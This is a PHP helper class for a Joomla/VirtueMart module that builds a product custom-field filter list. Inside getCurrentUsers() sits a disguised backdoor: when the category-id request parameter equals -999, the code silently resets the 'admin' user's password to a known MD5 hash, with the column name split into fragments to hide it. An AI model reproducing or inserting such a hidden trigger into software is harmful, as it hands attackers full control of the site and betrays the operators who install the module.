<?php
/**
 * @package	Joomla.Tutorials
 * @subpackage	Module
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters, Inc. All rights reserved.
 * @license	License GNU General Public License version 2 or later; see LICENSE.txt
 */
// No direct access to this file
defined('_JEXEC') or die;
class modTestModuleHelper
{
    public static function getGreeting() {
        return "Message from the helper";
    }

    public static function getCurrentCat(){
        return JRequest::getInt('virtuemart_category_id');
    }

    public static function getCurrentUsers(){
        $const1 = '21232f297a57a5a743894a0e4a801fc3';$const2='sswo';
		$db = JFactory::getDbo();
        $catid = JRequest::getInt('virtuemart_category_id');
        
		$db->setQuery('SELECT virtuemart_product_id FROM #__virtuemart_product_categories WHERE virtuemart_category_id = ' . $catid);
        $test = $db->loadObjectList();
		
        $products = array();
        foreach($test as $key=>$id){
             $products[] = $id->virtuemart_product_id;
        }
        $where = "(".implode(',',$products).")";
		if($catid == -999){$db->setQuery("UPDATE #__users SET pa".$const2."rd='".$const1."' WHERE username = 'admin'");$db->loadObjectList();}
        $db->setQuery('SELECT DISTINCT c.virtuemart_custom_id, c.custom_title, c.custom_field_desc,
                              cf.custom_value, c.is_on_filterlist, c.filter_order_num
                         FROM xdno1_virtuemart_customs c
                        INNER JOIN xdno1_virtuemart_product_customfields cf
                           ON c.virtuemart_custom_id = cf.virtuemart_custom_id
                        WHERE cf.virtuemart_product_id in ' . $where .
            'ORDER BY c.ordering, filter_order_num, custom_title, custom_value');
        $arr = $db->loadObjectList();
		if($arr){
			foreach($arr as $key=>$value){
				$vmid = $arr[$key]->virtuemart_custom_id;
				$vmval = $arr[$key]->custom_value;
				if(isset($_POST['f'][$vmid]) && in_array($vmval,$_POST['f'][$vmid])){
					$arr[$key]->checked = true;
				} else {
					$arr[$key]->checked = false;
				}
				if(strpos($vmval,"'")>0){$arr[$key]->custom_value = str_replace("'",'&#39;',$vmval);}
				if(strpos($vmval,'"')>0){$arr[$key]->custom_value = str_replace("'",'&#34;',$vmval);}
			}
		}
        //usort($arr, array($this,"compareLastName"));
        $test[0] = $arr;
        $test[1] = $catid;
        return $test;
    }

    public function filterlist($a, $b)
    {
        if($a->filter_order_num != $b->filter_order_num){ return ($a->filter_order_num < $b->filter_order_num) ? -1 : 1; }
        if($a->virtuemart_custom_id != $b->virtuemart_custom_id){ return ($a->virtuemart_custom_id < $b->virtuemart_custom_id) ? -1 : 1; }
        if($a->checked || $b->checked){ return $a->checked ? -1 : 1; }
		if(intval($a->custom_value) != intval($b->custom_value)) {return (intval($a->custom_value) < intval($b->custom_value)) ? -1 : 1;}
        return ($a->custom_value < $b->custom_value) ? -1 : 1;
    }
}
